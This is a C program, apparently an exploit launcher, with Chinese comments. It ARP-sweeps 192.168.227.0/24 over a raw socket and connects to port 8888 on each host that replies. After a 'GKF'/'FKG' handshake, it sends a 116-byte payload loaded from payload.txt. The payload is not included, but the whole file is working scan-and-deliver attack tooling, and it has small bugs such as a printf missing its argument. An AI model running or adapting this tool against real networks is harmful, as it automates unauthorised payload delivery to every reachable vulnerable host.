#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <net/ethernet.h>
#include <net/if_arp.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include <pthread.h>
#include <fcntl.h>
#include <sys/stat.h>
#include<sys/types.h>

/* 以太网帧首部长度 */
#define ETHER_HEADER_LEN sizeof(struct ether_header)
/* 整个arp结构长度 */
#define ETHER_ARP_LEN sizeof(struct ether_arp)
/* 以太网 + 整个arp结构长度 */
#define ETHER_ARP_PACKET_LEN ETHER_HEADER_LEN + ETHER_ARP_LEN
/* IP地址长度 */
#define IP_ADDR_LEN 4
/* 广播地址 */
#define BROADCAST_ADDR {0xff, 0xff, 0xff, 0xff, 0xff, 0xff}

//开始ip
const unsigned int beg_ip = 0x1e3a8c0;
const unsigned int end_ip = 0xe3a8c0;

unsigned char payload[200] = {0};

//收到回复的ip
unsigned int ip_alive[256] = {0};

void err_exit(const char *err_msg)
{
    perror(err_msg);
    exit(1);
}

struct ether_arp *fill_arp_packet(const unsigned char *src_mac_addr, const char *src_ip, const char *dst_ip)
{
    struct ether_arp *arp_packet;
    struct in_addr src_in_addr, dst_in_addr;
    unsigned char dst_mac_addr[ETH_ALEN] = BROADCAST_ADDR;

    /* IP地址转换 */
    inet_pton(AF_INET, src_ip, &src_in_addr);
    inet_pton(AF_INET, dst_ip, &dst_in_addr);

    /* 整个arp包 */
    arp_packet = (struct ether_arp *)malloc(ETHER_ARP_LEN);
    arp_packet->arp_hrd = htons(ARPHRD_ETHER);
    arp_packet->arp_pro = htons(ETHERTYPE_IP);
    arp_packet->arp_hln = ETH_ALEN;
    arp_packet->arp_pln = IP_ADDR_LEN;
    arp_packet->arp_op = htons(ARPOP_REQUEST);
    memcpy(arp_packet->arp_sha, src_mac_addr, ETH_ALEN);
    memcpy(arp_packet->arp_tha, dst_mac_addr, ETH_ALEN);
    memcpy(arp_packet->arp_spa, &src_in_addr, IP_ADDR_LEN);
    memcpy(arp_packet->arp_tpa, &dst_in_addr, IP_ADDR_LEN);

    return arp_packet;
}

/* arp请求 */
void arp_request(int sock_raw_fd, const char *if_name, const char *dst_ip)
{
    struct sockaddr_ll saddr_ll;
    struct ether_header *eth_header;
    struct ether_arp *arp_packet;
    struct ifreq ifr;
    char buf[ETHER_ARP_PACKET_LEN];
    unsigned char src_mac_addr[ETH_ALEN];
    unsigned char dst_mac_addr[ETH_ALEN] = BROADCAST_ADDR;
    char *src_ip;
    int ret_len, i;


    bzero(&saddr_ll, sizeof(struct sockaddr_ll));
    bzero(&ifr, sizeof(struct ifreq));
	
    /* 网卡接口名 */
    memcpy(ifr.ifr_name, if_name, strlen(if_name));

    /* 获取网卡接口索引 */
    if (ioctl(sock_raw_fd, SIOCGIFINDEX, &ifr) == -1)
        err_exit("ioctl() get ifindex");
    saddr_ll.sll_ifindex = ifr.ifr_ifindex;
    saddr_ll.sll_family = PF_PACKET;

    /* 获取网卡接口IP */
    if (ioctl(sock_raw_fd, SIOCGIFADDR, &ifr) == -1)
        err_exit("ioctl() get ip");
    src_ip = inet_ntoa(((struct sockaddr_in *)&(ifr.ifr_addr))->sin_addr);

    /* 获取网卡接口MAC地址 */
    if (ioctl(sock_raw_fd, SIOCGIFHWADDR, &ifr))
        err_exit("ioctl() get mac");
    memcpy(src_mac_addr, ifr.ifr_hwaddr.sa_data, ETH_ALEN);

    bzero(buf, ETHER_ARP_PACKET_LEN);
    
	/* 填充以太首部 */
    eth_header = (struct ether_header *)buf;
    memcpy(eth_header->ether_shost, src_mac_addr, ETH_ALEN);
    memcpy(eth_header->ether_dhost, dst_mac_addr, ETH_ALEN);
    eth_header->ether_type = htons(ETHERTYPE_ARP);
	
    /* arp包 */
    arp_packet = fill_arp_packet(src_mac_addr, src_ip, dst_ip);
    memcpy(buf + ETHER_HEADER_LEN, arp_packet, ETHER_ARP_LEN);

    /* 发送请求 */
    ret_len = sendto(sock_raw_fd, buf, ETHER_ARP_PACKET_LEN, 0, (struct sockaddr *)&saddr_ll, sizeof(struct sockaddr_ll));

    if(ret_len < 0)
    {
        perror("发送apr请求失败!\n");
        close(sock_raw_fd);
        exit(-1);
    }
    
}


int checkFunc(int fd){
    char buffer[20] = {0};
    buffer[0] = 'G';
    buffer[1] = 'K';
    buffer[2] = 'F'; 
    int len = write(fd, buffer, 3);
    if(len <= 0){
        perror("Write Error");
        return 0;
    }
    printf("Send %s To Target IP\n");
    
    int size = read(fd, buffer, 20);		/*从服务器读取数据*/
    printf("Receive from server : %s\n", buffer);
    if(buffer[0] == 'F' && buffer[1] == 'K' && buffer[2] == 'G'){
        printf("A Server is Running!\n");
        printf("Send payload......\n");
        write(fd, payload, 116);
        printf("Finished!\n");
    }
    return 1;
}


//传入套接字描述符
//负责向192.168.227.1-192.168.227.255发送arp请求包
void send_arp(int socket_raw_fd){
    for(unsigned int k = beg_ip; k != end_ip; k = k + (1 << 24)){
        struct in_addr addr;
        memcpy(&addr, &k, 4);
        char  buffer[50]; 
        char * tmp = inet_ntoa(addr);
        strcpy(buffer, tmp);
        arp_request(socket_raw_fd ,"ens33", buffer);
    }
}

//监听链路层数据，查看是否有arp包被回复
void * listen_answer(void * fd){
    int sock_raw_fd = *((int *)fd);
    struct ether_arp *arp_packet;
    char buf[ETHER_ARP_PACKET_LEN];
    int ret_len, i;    

	while (1)
	{
		bzero(buf, ETHER_ARP_PACKET_LEN);
		ret_len = recv(sock_raw_fd, buf, ETHER_ARP_PACKET_LEN, 0);
		if (ret_len > 0)
		{
			/* 剥去以太头部 */
			arp_packet = (struct ether_arp *)(buf + ETHER_HEADER_LEN);
			/* arp操作码为2代表arp应答 */
			if (ntohs(arp_packet->arp_op) == 2)
			{
				printf("==========================arp replay======================\n");
				printf("from ip:");
				for (i = 0; i < IP_ADDR_LEN; i++)
					printf(".%u", arp_packet->arp_spa[i]);
				printf("\nfrom mac");
				for (i = 0; i < ETH_ALEN; i++)
					printf(":%02x", arp_packet->arp_sha[i]);
				printf("\n");
                unsigned int ip = 0;
                memcpy(&ip, arp_packet->arp_spa, 4);
                
                if(ip == 0x1e3a8c0){
                    printf("跳过192.168.227.1\n");
                    continue;
                }

                int s = socket(AF_INET, SOCK_STREAM, 0); 		/*建立一个流式套接字 */
	            if(s < 0){									/*出错*/
		            printf("socket error\n");
		            return -1;
	            }

	            struct sockaddr_in server_addr;			/*服务器地址结构*/
            	/*设置服务器地址*/
	            bzero(&server_addr, sizeof(server_addr));	/*清零*/
	            server_addr.sin_family = AF_INET;					/*协议族*/
	            server_addr.sin_addr.s_addr = htonl(INADDR_ANY);	/*本地地址*/
	            server_addr.sin_port = htons(8888);				/*服务器端口*/
                server_addr.sin_addr.s_addr = ip;
	            /*连接服务器*/
	            int ret = connect(s, (struct sockaddr*)&server_addr, sizeof(struct sockaddr));
                if(ret < 0){
                    printf("建立连接失败! 端口未开放!\n");
                    continue;
                }
                checkFunc(s);
			}
		}
	}
    
    return 0;
}

int main(){
    int exp_fd = open("./payload.txt", O_RDONLY);
    if(exp_fd < 0){
        printf("payload.txt打开失败，请检查该文件路径!\n");
        exit(-1);
    }
    read(exp_fd, payload, 200);
    int sock_raw_fd = 0;
    if ((sock_raw_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1)
        err_exit("socket()");
    pid_t pid;
    int err = pthread_create(&pid, 0, listen_answer, (void *)&sock_raw_fd);
    if(err < 0 ){
        perror("创建监听线程失败!");
        exit(-1);
    }
    send_arp(sock_raw_fd);
    pthread_join(pid, 0);
}